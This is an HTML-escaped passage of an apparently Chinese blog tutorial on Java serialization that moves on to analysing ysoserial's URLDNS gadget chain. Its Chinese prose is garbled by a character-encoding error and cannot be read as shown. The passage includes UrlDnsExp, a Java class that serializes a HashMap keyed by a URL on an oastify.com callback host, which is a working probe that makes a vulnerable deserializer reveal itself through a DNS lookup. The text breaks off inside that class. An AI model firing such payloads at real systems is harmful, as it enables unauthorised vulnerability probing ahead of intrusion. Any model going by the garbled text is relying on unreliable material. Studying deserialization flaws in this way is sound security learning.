&lt;p&gt;ä¸Šé¢æˆ‘ä»¬ä½¿ç”¨&lt;code&gt;writeObject&lt;/code&gt;æ¥è¿›è¡Œå†™å…¥åºåˆ—åŒ–å†…å®¹ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨&lt;code&gt;readObject&lt;/code&gt;æ¥ååºåˆ—åŒ–åºåˆ—åŒ–åçš„æ–‡ä»¶ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.io.FileInputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.io.IOException&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.io.ObjectInputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;UnSerial_Test&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;Serializable_01&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Ser&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;ObjectInputStream&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;obj&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;obj&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ObjectInputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;FileInputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;xiaoming.ser&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;Ser&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Serializable_01&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;obj&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;readObject&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;Ser&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;Method1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;println&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Ser&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;obj&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;IOException&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;printStackTrace&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ClassNotFoundException&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;printStackTrace&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¸Šé¢ä»£ç æ‰§è¡Œåè¾“å‡ºçš„ç»“æœï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Method1 Running
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;xiaomign
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æœ‰äº›åŒå­¦å¾ˆå¥‡æ€ªè¯´ä¸ºä»€ä¹ˆè¦åŠ è¿™ä¸€å¥å•Šï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Ser&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Serializable_01&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;obj&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;readObject&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¦‚æœæˆ‘ä»¬ç›´æ¥ä½¿ç”¨ä¸‹é¢æ¥è§¦å‘&lt;code&gt;ToString&lt;/code&gt;æ–¹æ³•ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;System.out.println(obj.readObject());
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å‘ç°è¾“å‡ºä¸‹é¢å†…å®¹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Serializable_01{name=&amp;#39;xiaomign&amp;#39;, age=12}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä½†æ˜¯ä½ æ— æ³•ä½¿ç”¨&lt;code&gt;obj.readObject().Method1&lt;/code&gt;å»è§¦å‘å¯¹è±¡é‡Œé¢çš„æ–¹æ³•ï¼Œå› ä¸ºæ²¡æœ‰ç”¨å¯¹è±¡è½¬æ¢ä¹‹å‰æ˜¯ä¸€ä¸ª&lt;code&gt;Object&lt;/code&gt;ç±»ï¼Œæ‰€ä»¥åªèƒ½å‡ºå‘&lt;code&gt;Object&lt;/code&gt;ç±»é»˜è®¤çš„æ–¹æ³•ã€‚&lt;/p&gt;
&lt;h2 id=&#34;ä¸ºä»€ä¹ˆéœ€è¦åºåˆ—åŒ–ä¸ååºåˆ—åŒ–&#34;&gt;ä¸ºä»€ä¹ˆéœ€è¦åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ï¼Ÿ&lt;/h2&gt;
&lt;p&gt;ä¸ºä»€ä¹ˆè¦åºåˆ—åŒ–ï¼Œé‚£å°±æ˜¯è¯´ä¸€ä¸‹åºåˆ—åŒ–çš„å¥½å¤„å–½ï¼Œåºåˆ—åŒ–æœ‰ä»€ä¹ˆä»€ä¹ˆä¼˜ç‚¹ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦åºåˆ—åŒ–ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ä¸€ï¼šå¯¹è±¡åºåˆ—åŒ–å¯ä»¥å®ç°åˆ†å¸ƒå¼å¯¹è±¡ã€‚&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ä¸»è¦åº”ç”¨ä¾‹å¦‚ï¼šRMI(å³è¿œç¨‹è°ƒç”¨Remote Method Invocation)è¦åˆ©ç”¨å¯¹è±¡åºåˆ—åŒ–è¿è¡Œè¿œç¨‹ä¸»æœºä¸Šçš„æœåŠ¡ï¼Œå°±åƒåœ¨æœ¬åœ°æœºä¸Šè¿è¡Œå¯¹è±¡æ—¶ä¸€æ ·ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;äºŒï¼šjavaå¯¹è±¡åºåˆ—åŒ–ä¸ä»…ä¿ç•™ä¸€ä¸ªå¯¹è±¡çš„æ•°æ®ï¼Œè€Œä¸”é€’å½’ä¿å­˜å¯¹è±¡å¼•ç”¨çš„æ¯ä¸ªå¯¹è±¡çš„æ•°æ®ã€‚&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;å¯ä»¥å°†æ•´ä¸ªå¯¹è±¡å±‚æ¬¡å†™å…¥å­—èŠ‚æµä¸­ï¼Œå¯ä»¥ä¿å­˜åœ¨æ–‡ä»¶ä¸­æˆ–åœ¨ç½‘ç»œè¿æ¥ä¸Šä¼ é€’ã€‚åˆ©ç”¨å¯¹è±¡åºåˆ—åŒ–å¯ä»¥è¿›è¡Œå¯¹è±¡çš„&amp;quot;æ·±å¤åˆ¶&amp;quot;ï¼Œå³å¤åˆ¶å¯¹è±¡æœ¬èº«åŠå¼•ç”¨çš„å¯¹è±¡æœ¬èº«ã€‚åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡å¯èƒ½å¾—åˆ°æ•´ä¸ªå¯¹è±¡åºåˆ—ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ä¸‰ï¼šåºåˆ—åŒ–å¯ä»¥å°†å†…å­˜ä¸­çš„ç±»å†™å…¥æ–‡ä»¶æˆ–æ•°æ®åº“ä¸­ã€‚&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;æ¯”å¦‚ï¼šå°†æŸä¸ªç±»åºåˆ—åŒ–åå­˜ä¸ºæ–‡ä»¶ï¼Œä¸‹æ¬¡è¯»å–æ—¶åªéœ€å°†æ–‡ä»¶ä¸­çš„æ•°æ®ååºåˆ—åŒ–å°±å¯ä»¥å°†åŸå…ˆçš„ç±»è¿˜åŸåˆ°å†…å­˜ä¸­ã€‚ä¹Ÿå¯ä»¥å°†ç±»åºåˆ—åŒ–ä¸ºæµæ•°æ®è¿›è¡Œä¼ è¾“ã€‚&lt;/p&gt;
&lt;p&gt;æ€»çš„æ¥è¯´å°±æ˜¯å°†ä¸€ä¸ªå·²ç»å®ä¾‹åŒ–çš„ç±»è½¬æˆæ–‡ä»¶å­˜å‚¨ï¼Œä¸‹æ¬¡éœ€è¦å®ä¾‹åŒ–çš„æ—¶å€™åªè¦ååºåˆ—åŒ–å³å¯å°†ç±»å®ä¾‹åŒ–åˆ°å†…å­˜ä¸­å¹¶ä¿ç•™åºåˆ—åŒ–æ—¶ç±»ä¸­çš„æ‰€æœ‰å˜é‡å’ŒçŠ¶æ€ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;å››ï¼šå¯¹è±¡ã€æ–‡ä»¶ã€æ•°æ®ï¼Œæœ‰è®¸å¤šä¸åŒçš„æ ¼å¼ï¼Œå¾ˆéš¾ç»Ÿä¸€ä¼ è¾“å’Œä¿å­˜ã€‚&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;åºåˆ—åŒ–ä»¥åå°±éƒ½æ˜¯å­—èŠ‚æµäº†ï¼Œæ— è®ºåŸæ¥æ˜¯ä»€ä¹ˆä¸œè¥¿ï¼Œéƒ½èƒ½å˜æˆä¸€æ ·çš„ä¸œè¥¿ï¼Œå°±å¯ä»¥è¿›è¡Œé€šç”¨çš„æ ¼å¼ä¼ è¾“æˆ–ä¿å­˜ï¼Œä¼ è¾“ç»“æŸä»¥åï¼Œè¦å†æ¬¡ä½¿ç”¨ï¼Œå°±è¿›è¡Œååºåˆ—åŒ–è¿˜åŸï¼Œè¿™æ ·å¯¹è±¡è¿˜æ˜¯å¯¹è±¡ï¼Œæ–‡ä»¶è¿˜æ˜¯æ–‡ä»¶ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;è¿™å—å†…å®¹æ‘˜å½•è‡ªï¼š&lt;a href=&#34;https://www.cnblogs.com/javazhiyin/&#34;&gt;JavaçŸ¥éŸ³&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;0x02-urldnsé“¾åˆ†æ&#34;&gt;0x02 URLDNSé“¾åˆ†æ&lt;/h1&gt;
&lt;p&gt;URLDNSæ˜¯ysoserialä¸­ä¸€ä¸ªåˆ©ç”¨é“¾çš„åå­—ï¼Œä½†å‡†ç¡®æ¥è¯´ï¼Œè¿™ä¸ªå…¶å®ä¸èƒ½ç§°ä½œâ€œåˆ©â½¤é“¾â€ã€‚å› ä¸ºå…¶å‚æ•°ä¸æ˜¯â¼€ä¸ªå¯ä»¥â€œåˆ©â½¤â€çš„å‘½ä»¤ï¼Œâ½½ä»…ä¸ºâ¼€ä¸ªURLï¼Œå…¶èƒ½è§¦å‘çš„ç»“æœä¹Ÿä¸æ˜¯å‘½ä»¤æ‰§â¾ï¼Œâ½½æ˜¯â¼€æ¬¡DNSè¯·æ±‚ã€‚&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯å®ƒæœ‰ä»¥ä¸‹ä¼˜ç‚¹ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ä½¿ç”¨Javaå†…ç½®çš„ç±»æ„é€ ï¼Œå¯¹ç¬¬ä¸‰æ–¹åº“æ²¡æœ‰ä¾èµ–&lt;/li&gt;
&lt;li&gt;åœ¨ç›®æ ‡æ²¡æœ‰å›æ˜¾çš„æ—¶å€™ï¼Œèƒ½å¤Ÿé€šè¿‡DNSæ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨ååºåˆ—åŒ–æ¼æ´&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;åºåˆ—åŒ–åˆ†æ&#34;&gt;åºåˆ—åŒ–åˆ†æ&lt;/h2&gt;
&lt;p&gt;æˆ‘ä»¬å…ˆæ¥å†™ä¸€ä¸ªåºåˆ—åŒ–çš„å¯¹è±¡ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.io.FileOutputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.io.ObjectOutputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.lang.reflect.Field&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.net.URL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.util.HashMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;UrlDnsExp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Exception&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;HashMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;URL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;obj&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;HashMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;URL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;URL&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;url&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;URL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;http://hyji8wgb7eebb7rimnzf84prfil9mxb.oastify.com&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;obj&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;put&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;1234&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;c1&#34;&gt;//åºåˆ—åŒ–
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;n&#34;&gt;FileOutputStream&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fo&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;FileOutputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;dns.ser&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;ObjectOutputStream&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;objectOutputStream&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ObjectOutputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fo&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;objectOutputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;writeObject&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;obj&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;objectOutputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
